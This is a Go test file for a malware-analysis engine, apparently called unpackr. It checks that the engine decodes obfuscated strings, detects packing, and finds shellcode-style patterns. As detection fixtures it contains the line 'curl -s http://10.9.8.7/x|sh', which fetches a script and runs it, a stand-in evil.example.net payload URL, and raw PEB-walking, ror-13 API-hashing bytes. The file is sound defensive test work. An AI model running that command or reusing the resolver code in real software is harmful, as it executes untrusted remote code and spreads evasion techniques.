package engine

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/Yanliangchan/unpackr/pkg/models"
	"github.com/Yanliangchan/unpackr/tests/fixtures"
)

func analyse(t *testing.T, path string) *models.Analysis {
	t.Helper()
	rep, err := Analyze(context.Background(), path, opts())
	if err != nil {
		t.Fatal(err)
	}
	if rep.Analysis == nil {
		t.Fatal("no analysis")
	}
	return rep.Analysis
}

func recovered(a *models.Analysis, method, text string) bool {
	for _, d := range a.Decoded {
		if d.Method == method && d.Text == text {
			return true
		}
	}
	return false
}

func hasIndicator(a *models.Analysis, typ, value string) bool {
	for _, i := range a.Indicators {
		if i.Type == typ && i.Value == value {
			return true
		}
	}
	return false
}

func hasSignal(a *models.Analysis, id string) bool {
	for _, s := range a.Packing.Signals {
		if s.ID == id {
			return true
		}
	}
	return false
}

func TestObfuscationCorpus(t *testing.T) {
	const url = "http://evil.example.net/payload"

	t.Run("xor strings in read-only data", func(t *testing.T) {
		a := analyse(t, fixtures.EncodedStaticStrings(t, "xor", 0x5a))
		if !recovered(a, "xor", url) || !recovered(a, "xor", "/bin/sh -c id") {
			t.Fatalf("not recovered: %+v", a.Decoded)
		}
		if !hasIndicator(a, "url", url) {
			t.Errorf("decoded URL missing from indicators: %+v", a.Indicators)
		}
		if a.Packing.State != models.PackObfuscated || a.Packing.Confidence != models.ConfidenceHigh {
			t.Errorf("state %s/%s: %s", a.Packing.State, a.Packing.Confidence, a.Packing.Rationale)
		}
	})
	t.Run("add strings in read-only data", func(t *testing.T) {
		a := analyse(t, fixtures.EncodedStaticStrings(t, "add", 0x13))
		if !recovered(a, "add", url) {
			t.Fatalf("not recovered: %+v", a.Decoded)
		}
	})
	t.Run("xor strings built on the stack", func(t *testing.T) {
		a := analyse(t, fixtures.EncodedStackStrings(t, 0x6b))
		if !recovered(a, "xor", url) {
			t.Fatalf("not recovered: %+v", a.Decoded)
		}
		if a.Packing.State != models.PackObfuscated {
			t.Errorf("state %s", a.Packing.State)
		}
	})
	t.Run("plain stack string", func(t *testing.T) {
		if runtime.GOARCH != "amd64" {
			t.Skip("stack-string recovery understands x86 and x86-64 instruction encodings only")
		}
		a := analyse(t, fixtures.PlainStackString(t))
		if !recovered(a, "stack", "curl -s http://10.9.8.7/x|sh") {
			t.Fatalf("not recovered: %+v", a.Decoded)
		}
		if a.Packing.Confidence == models.ConfidenceHigh && a.Packing.State == models.PackObfuscated {
			t.Errorf("pattern-matched stack text must not reach high confidence: %+v", a.Packing)
		}
	})
	t.Run("run-time symbol resolution alone", func(t *testing.T) {
		a := analyse(t, fixtures.DynamicResolveOnly(t))
		found := false
		for _, c := range a.Capabilities {
			found = found || c.ID == "evasion.dynamic-resolve"
		}
		if !found {
			t.Errorf("dlsym not reported: %+v", a.Capabilities)
		}
		if a.Packing.State == models.PackObfuscated || a.Packing.State == models.PackLikely || a.Packing.State == models.PackConfirmed {
			t.Errorf("dlsym alone must not make a file look packed: %s", a.Packing.State)
		}
	})
	t.Run("encrypted overlay is suspicious but not a verdict", func(t *testing.T) {
		a := analyse(t, fixtures.WithEncryptedOverlay(t, fixtures.CleanProgram(t), 64<<10))
		if !hasSignal(a, "pack.entropy.overlay") {
			t.Fatalf("overlay not noticed: %+v", a.Packing)
		}
		if a.Packing.State != models.PackUnknown {
			t.Errorf("entropy alone must stay 'unknown', got %s", a.Packing.State)
		}
	})
	t.Run("UPX with markers stripped", func(t *testing.T) {
		packed := fixtures.PackWithUPX(t, fixtures.CleanProgram(t))
		a := analyse(t, fixtures.StripUPXMarkers(t, packed))
		if a.Packing.State != models.PackLikely {
			t.Fatalf("state %s (%s): %+v", a.Packing.State, a.Packing.Rationale, a.Packing.Signals)
		}
		if a.Packing.Family != "" {
			t.Errorf("no family can be named without the markers, got %q", a.Packing.Family)
		}
		if !hasSignal(a, "pack.elf.expanding-segment") {
			t.Errorf("structural signal missing: %+v", a.Packing.Signals)
		}
	})
	t.Run("clean program is left alone", func(t *testing.T) {
		a := analyse(t, fixtures.CleanProgram(t))
		if len(a.Decoded) != 0 || a.Packing.State != models.PackUnpacked {
			t.Errorf("false positive: %d decoded, state %s", len(a.Decoded), a.Packing.State)
		}
		for _, f := range []string{"obfuscation"} {
			for _, s := range a.Packing.Signals {
				if strings.Contains(s.ID, f) {
					t.Errorf("unexpected signal %s", s.ID)
				}
			}
		}
	})
}

// realManaged returns a genuine managed assembly shipped as test data with the
// saferwall/pe module (a benign Microsoft-signed C++/CLI plug-in). It is read in
// place and never copied into this repository.
func realManaged(t *testing.T, name string) string {
	t.Helper()
	out, err := exec.Command("go", "list", "-m", "-f", "{{.Dir}}", "github.com/saferwall/pe").Output()
	if err != nil {
		t.Skip("module directory not available")
	}
	p := filepath.Join(strings.TrimSpace(string(out)), "test", name)
	if _, err := os.Stat(p); err != nil {
		t.Skip("sample not available")
	}
	return p
}

func TestRealManagedAssemblyEndToEnd(t *testing.T) {
	rep, err := Analyze(context.Background(), realManaged(t, "pspluginwkr.dll"), opts())
	if err != nil {
		t.Fatal(err)
	}
	dn := rep.Binary.DotNet
	if dn == nil || dn.AssemblyName != "pspluginwkr" || dn.Counts["TypeDef"] != 169 {
		t.Fatalf("metadata not read: %+v", dn)
	}
	var lib bool
	for _, im := range rep.Binary.Imports {
		lib = lib || (im.Library == ".NET references" && len(im.Functions) > 100)
	}
	if !lib {
		t.Error("member references should be listed as imports of the .NET references library")
	}
	// A benign, readable assembly must not look protected.
	if rep.Analysis.Packing.State != models.PackUnpacked {
		t.Errorf("benign assembly flagged: %s %+v", rep.Analysis.Packing.State, rep.Analysis.Packing.Signals)
	}
	if len(rep.Analysis.Decoded) != 0 {
		t.Errorf("decoded strings in a benign assembly: %+v", rep.Analysis.Decoded)
	}
}

// shellcode-style module resolution: PEB, loader list, ror-13 name hash.
func peResolverCode() []byte {
	var c []byte
	// 64-bit: mov rax, gs:[0x60] ; mov rax,[rax+0x18] ; mov rdx,[rax+0x20]
	c = append(c, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0, 0, 0, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x50, 0x20)
	// loop: lodsb ; ror edi,13 ; add edi,eax ; jne loop
	c = append(c, 0x90, 0x90, 0xAC, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0x75, 0xF8)
	return c
}

func TestDeepProfileFindsCodePatterns(t *testing.T) {
	path := write(t, "resolver.exe", fixtures.BuildPE(fixtures.PESpec{Code: peResolverCode(), Imports: map[string][]string{"KERNEL32.dll": {"ExitProcess"}}}))
	deep := opts()
	deep.Profile = ProfileDeep
	rep, err := Analyze(context.Background(), path, deep)
	if err != nil {
		t.Fatal(err)
	}
	d := rep.Analysis.Disasm
	if d == nil || d.Counts["peb-ldr-walk"] != 1 || d.Counts["api-hash-ror13"] != 1 {
		t.Fatalf("patterns not found: %+v", d)
	}
	if rep.Analysis.Packing.State != models.PackObfuscated {
		t.Errorf("code patterns alone should give 'obfuscated', got %s (%s)", rep.Analysis.Packing.State, rep.Analysis.Packing.Rationale)
	}
	if rep.Analysis.Packing.Confidence == models.ConfidenceHigh {
		t.Errorf("heuristics must not reach high confidence: %s", rep.Analysis.Packing.Confidence)
	}
	found := 0
	for _, f := range rep.Findings {
		if strings.HasPrefix(f.ID, "obfuscation.code.") {
			found++
			if f.Confidence == models.ConfidenceHigh || len(f.EvidenceID) == 0 {
				t.Errorf("finding %s: %+v", f.ID, f)
			}
		}
	}
	if found != 2 {
		t.Errorf("want 2 code-pattern findings, got %d", found)
	}
	for _, n := range rep.NotRun {
		if strings.HasPrefix(n, "code-pattern-analysis") {
			t.Errorf("the deep profile ran the stage; it must not be listed as not run: %s", n)
		}
	}

	// The default profile does not run it, and says so.
	info, err := Analyze(context.Background(), path, opts())
	if err != nil {
		t.Fatal(err)
	}
	if info.Analysis.Disasm != nil {
		t.Error("info profile must not disassemble")
	}
	var listed bool
	for _, n := range info.NotRun {
		listed = listed || n == NotRunCodePatterns
	}
	if !listed {
		t.Errorf("not_run should list the skipped stage: %v", info.NotRun)
	}
}

func TestDeepProfileOnOrdinaryCodeFindsNothing(t *testing.T) {
	deep := opts()
	deep.Profile = ProfileDeep
	a := func(p string) *models.Analysis {
		rep, err := Analyze(context.Background(), p, deep)
		if err != nil {
			t.Fatal(err)
		}
		return rep.Analysis
	}
	for name, p := range map[string]string{"clean C program": fixtures.CleanProgram(t), "Go program": fixtures.GoBinary(t, "linux", "amd64")} {
		d := a(p).Disasm
		if d == nil || d.Skipped != "" || d.Instructions == 0 {
			t.Fatalf("%s: nothing examined: %+v", name, d)
		}
		if len(d.Sites) != 0 {
			t.Errorf("%s: false positives: %+v", name, d.Sites)
		}
	}
}

func TestDeepProfileSkipsOtherArchitecturesVisibly(t *testing.T) {
	arm := fixtures.BuildPE(fixtures.PESpec{Machine: 0xaa64, Code: []byte{0x1f, 0x20, 0x03, 0xd5}})
	deep := opts()
	deep.Profile = ProfileDeep
	rep, err := Analyze(context.Background(), write(t, "arm.exe", arm), deep)
	if err != nil {
		t.Fatal(err)
	}
	if d := rep.Analysis.Disasm; d == nil || d.Skipped == "" {
		t.Fatalf("an ARM image must be reported as skipped: %+v", d)
	}
	var listed bool
	for _, n := range rep.NotRun {
		listed = listed || strings.HasPrefix(n, "code-pattern-analysis: skipped")
	}
	if !listed {
		t.Errorf("skip must appear in not_run: %v", rep.NotRun)
	}
}
